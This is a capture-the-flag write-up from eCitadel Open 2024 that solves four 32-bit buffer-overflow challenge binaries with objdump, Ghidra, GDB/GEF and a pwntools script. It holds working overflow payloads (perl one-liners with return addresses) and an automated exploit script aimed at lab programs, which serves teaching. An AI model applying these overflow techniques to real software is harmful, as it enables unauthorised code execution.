---
title: eCitadel 24 "Buffer Overflow"
date: 2024-05-21
description: Quick explanation of five different methods to solve a buffer overflow challenge.
categories:
  - pwn
  - x86-32
---

More or less a simple explanation of a buffer overflow and how to exploit it. This challenge is from eCitadel Open 2024 as part of one of the injects. To give some background, the challenge wanted teams to submit a document detailing the artifact name, the location of a secret function within the artifact, the buffer offset needed to overflow the return address, and the secret flag that is printed out.

To make this more interesting, I'll solve each one of the 4 challenges using a different method.

<!-- more -->

## Method 1: Objdump Analysis
So unlike the other files, the first program does come with a source file, which tells us what its doing. You can see here its setting up a pointer that its going to jump to, then it gets the input from the user.

```c title="prog1.c" hl_lines="7-8"
int main(int argc, char *argv[]) {
	int var1;
	long long var2;
	char buf1[18];
	char buf2[191];
	char buf3[10];
	void (*ptr)() = public;
	gets(buf2);
	if (strncmp(passwd, buf2, 16) == 0)
		ptr = secret;
	ptr();
	return 0;
}
```

So let's look at the object dump of the main program

```asm title="objdump -d -M intel prog1"
080493f4 <main>:
 80493f4:  55                      push   ebp
 80493f5:  89 e5                   mov    ebp,esp
 80493f7:  83 e4 f0                and    esp,0xfffffff0
 80493fa:  81 ec f0 00 00 00       sub    esp,0xf0 # (1)
 8049400:  c7 84 24 ec 00 00 00    mov    DWORD PTR [esp+0xec],0x8049176 # (2)
 8049407:  76 91 04 08 
 804940b:  8d 44 24 1b             lea    eax,[esp+0x1b] # (3)
 804940f:  89 04 24                mov    DWORD PTR [esp],eax
 8049412:  e8 39 fc ff ff          call   8049050 <gets@plt>
 8049417:  c7 44 24 08 10 00 00    mov    DWORD PTR [esp+0x8],0x10
 804941e:  00 
 804941f:  8d 44 24 1b             lea    eax,[esp+0x1b]
 8049423:  89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8049427:  c7 04 24 08 a0 04 08    mov    DWORD PTR [esp],0x804a008
 804942e:  e8 2d fc ff ff          call   8049060 <strncmp@plt>
```

1. Function sets up the stack size `0xf0` (240 bytes)
2. It stores the pointer it jumps to `0xec` (236 bytes) into the stack
3. Our input is stored at `0x1b` (27 bytes) into the stack

So from this, we know we need to write into the pointer here, which is 236 bytes into the stack. We know that our input starts at 27 bytes into the stack, so to control the pointer, its as simple as writing doing a little math `236 - 27 = 209`. We need to write 209 bytes/characters to the program to control the pointer.

Real quick, we can grab the address of `#!c secret()` by grepping objdump:

```shell
$ objdump -d prog1 | grep "secret"
080493d5 <secret>:
```

So the address of `#!c secret()` is `0x080493d5`. Due to the endianness, we need to write the address in reverse order, so `d5 93 04 08`, and we'll add the prefix of `\x` to each byte so the program knows its a byte.

To test if we're correct, we can use perl to generate the input for us:

```shell
$ perl -e 'print "A"x209,"\xd5\x93\x04\x08"' | ./prog1
secret password is mHwPTuIYxDvmqUVS
```

And like that we get the secret password.

## Method 2: Decompiling

For this method, we'll open the binary in Ghidra and look at the decompiled code. Using standard analysis settings, we're immediately brought into the main function.

```c title="Ghidra's decompiled main()"
undefined4 main(void)
{
	int iVar1;
	char local_e4 [208];
	code *local_14;

	local_14 = public;
	gets(local_e4);
	iVar1 = strncmp("MyPnLXEhECLyBEwT",local_e4,0x10);
	if (iVar1 == 0) {
		local_14 = secret;
	}
	(*local_14)();
	return 0;
}
```

Immediately we can see the password it's checking for is `MyPnLXEhECLyBEwT`, if correct, it jumps to the secret function. Let's clean this up in Ghidra by renaming variables, you can simply do this by clicking on a function and pressing ++l++. Here's the cleaned up version:

```c title="Ghidra's decompiled main() cleaned up"
int main(void) 
{
	int passwd_result;
	char input_buffer [208];
	code *pointer;

	pointer = public;
	gets(input_buffer);
	passwd_result = strncmp("MyPnLXEhECLyBEwT",input_buffer,0x10);
	if (passwd_result == 0) {
		pointer = secret;
	}
	(*pointer)();
	return 0;
}
```

The nice thing about Ghidra is it figured out the compiled buffer size for us, which is `208` bytes, and with the pointer right after the buffer, it'll mean that we only need to write `208` characters/bytes to the program to control the pointer.

To get the address of `#!c secret()`, we can simply hover over the defined pointer in Ghidra, or we can press ++g++ to find the function. This gives us the address of `08049b1b`.

![Ghidra Secret Function](_assets/ghidra-secret-func.png "Finding the address of secret()")

Lets test our findings:

```shell
$ perl -e 'print "A"x208,"\x1b\x9b\x04\x08"' | ./prog2
secret password is MyPnLXEhECLyBEwT
```

Neat, we got the secret password (I know it's in the code, but we need the offset and addr for the challenge).

## Method 3: GDB Analysis
Most likely the fastest method, we can use GDB with GEF to generate a cyclic pattern to find at which point we control the EIP register (since the program is 32 bit). Once we know the offset, we can easily control which instruction we jump to.

Let's start by running the program in GDB and generating a cyclic pattern. We'll use something large like 250 bytes based on the past challenge files having large buffers.

```shell
$ gdb ./prog3
Reading symbols from ./prog3...
(No debugging symbols found in ./prog3)
gef➤  pattern create 250
[+] Generating a pattern of 250 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaah...snipped...cgaachaaciaacjaackaaclaacma
[+] Saved as '$_gef0'
```

Now we can run the program, and it should crash as we'll overwrite the return address with random characters that arent a valid address.

```shell
gef➤  run < $_gef0
─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x63636161 ("aacc"?)
$ebx   : 0xf7f8fff4  →  0x0021cd8c
$ecx   : 0x61      
$edx   : 0x0804a055  →  "ZmQQsmRExtDVVHqfpJwyfjFzUTI"
$esp   : 0xffffc8ec  →  0x0804937d  →  <main+103> mov eax, 0x0
$ebp   : 0xffffc9e8  →  "aacfaacgaachaaciaacjaackaaclaacma"
$esi   : 0x0804bf04  →  0x08049140  →  <__do_global_dtors_aux+0> endbr32 
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x63636161 ("aacc"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffc8ec│+0x0000: 0x0804937d  →  <main+103> mov eax, 0x0       ← $esp
0xffffc8f0│+0x0004: 0x0804a055  →  "ZmQQsmRExtDVVHqfpJwyfjFzUTI"
0xffffc8f4│+0x0008: 0xffffc90f  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
0xffffc8f8│+0x000c: 0x00000010
0xffffc8fc│+0x0010: 0xf7d7f614  →  0x000008b9
0xffffc900│+0x0014: 0xf63d4e2e
0xffffc904│+0x0018: 0x003055e4
0xffffc908│+0x001c: 0xf7fc1688  →  0xf7ffdbbc  →  0xf7fc17a0  →  0xf7ffda50  →  0x00000000
───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x63636161
───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "prog3", stopped 0x63636161 in ?? (), reason: SIGSEGV
```

Nice, so we can see that the program crashed because it tried to jump to `0x63636161`, which is part of the pattern we jumped to. How can we find the offset? GEF has a solution for that too, using the pattern search we can search for `0x63636161` or `aacc`, or better yet, we can just search for the current EIP register value.

```shell
gef➤  pattern search $eip
[+] Searching for '61616363'/'63636161' with period=4
[+] Found at offset 205 (little-endian search) likely
```

Just like that, we found the offset we need to control the return address. Now we can also quickly get the address of secret() by using the info functions command.

```shell
gef➤  info func secret
All functions matching regular expression "secret":

Non-debugging symbols:
0x080492f1  secret
```

So the address is `0x080492f1` and the offset we need is `205`. Let's test it out:

```shell
$ perl -e 'print "A"x205,"\xf1\x92\x04\x08"' | ./prog3
secret password is ZmQQsmRExtDVVHqf
```

Beautiful, we got the secret password.

## Method 4: Pwntools Automation
Lastly, and a bit more unconventional, but we can use pwntools to automate all of this for us. Here's a simple script using common pwnlib functions to automate the entire process for us, from generating the cyclic pattern to finding the offset, to getting the address of the secret function.

```python title="prog3.py"
from pwn import *

# Start the program and send a cyclic pattern
p = process("./prog3")
p.sendline(cyclic(250))
p.wait()

# Find the offset of the EIP register after the crash
offset = cyclic_find(p.corefile.eip)

# Get the address of the secret function (program is 32-bit and not stripped)
secret_address = p32(ELF("./prog3").symbols['secret'])

print(f"Offset: {offset}")
print(f"Secret Address: {secret_address}")

# Send the payload to a new instance of the program
p = process("./prog3")
p.sendline(b"A"*offset + secret_address)

print(p.recvall().decode())
```

Running it, we get the same output as before:

```shell
$ python prog3.py 
[+] Starting local process './prog3': pid 324046

[*] Process './prog3' stopped with exit code -11 (SIGSEGV) (pid 324046)
[+] Parsing corefile...: Done
[*] '/tmp/core.324046'
    Arch:      i386-32-little
    EIP:       0x63636161
    ESP:       0xffb6159c
    Exe:       '/tmp/prog3' (0x8048000)
    Fault:     0x63636161

[*] '/tmp/prog3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

Offset: 205
Secret Address: b'\xf1\x92\x04\x08'

[+] Starting local process './prog3': pid 324069
[+] Receiving all data: Done (36B)
[*] Process './prog3' stopped with exit code 0 (pid 324069)

secret password is ZmQQsmRExtDVVHqf
```

And there you have it, we got the secret password. Offset was `205` and our secret's address was `0x080492f1`.

I was going to do this originally for prog4, but then I realized halfway through that it was stripped, so to simplify things, I just did it for prog3.

## Stripped Binaries
To do this for a stripped binary like prog4, I'd suggest using a decompiler like Ghidra, jumping (using ++g++) to the `#!c entry()` function (since it's stripped and main will be named to something like `#!c FUN_080493f4()`), and looking at the decompiled code to figure out where the secret function is. Here's a quick example of that for the stripped binary:

![Ghidra Secret Function Stripped](_assets/ghidra-secret-func-stripped.png "Finding the address of the stripped secret()")

And from the decompiled view in Ghidra, I can see the buffer is `208` and that the stripped secret function is at `0x08049a11`. So quickly testing it out:

```shell
$ perl -e 'print "A"x208,"\x11\x9a\x04\x08"' | ./prog4
secret password is uydGNcvqhaNCYAJY
```

And there you have it, we got the secret password for the stripped binary.